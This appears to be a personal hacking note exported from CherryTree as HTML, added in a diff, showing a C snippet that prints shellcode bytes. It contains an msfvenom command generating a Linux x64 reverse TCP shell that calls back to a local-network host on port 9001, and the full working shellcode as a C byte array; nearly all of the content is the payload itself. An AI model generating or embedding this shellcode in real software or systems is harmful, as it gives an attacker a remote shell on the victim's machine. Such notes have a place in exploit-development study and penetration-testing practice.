@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Print bytes from char string</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+<body>
+<div class='page'><div class="codebox"><div class="codebox">//&nbsp;msfvenom&nbsp;-p&nbsp;linux/x64/shell_reverse_tcp&nbsp;LHOST=192.168.1.235&nbsp;LPORT=9001&nbsp;-f&nbsp;c<br />char&nbsp;payload[]&nbsp;=&nbsp;&quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\xb9\x02\x00\x23\x29\xc0\xa8\x01\xeb\x51\x48\x89\xe6\x6a\x10&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;;<br /><br />int&nbsp;payload_len&nbsp;=&nbsp;sizeof(payload);<br /><br />printf(&quot;payload&nbsp;len&nbsp;=&nbsp;%d&nbsp;\n&quot;,&nbsp;payload_len);<br />printf(&quot;payload&nbsp;=&nbsp;&quot;);<br />for&nbsp;(int&nbsp;i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;payload_len;&nbsp;i++)&nbsp;<br />{<br />&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;0x%.2x&nbsp;&quot;,&nbsp;payload[i]);<br />}<br />printf(&quot;\n&quot;);</div></div></div>
+</body>
+</html>
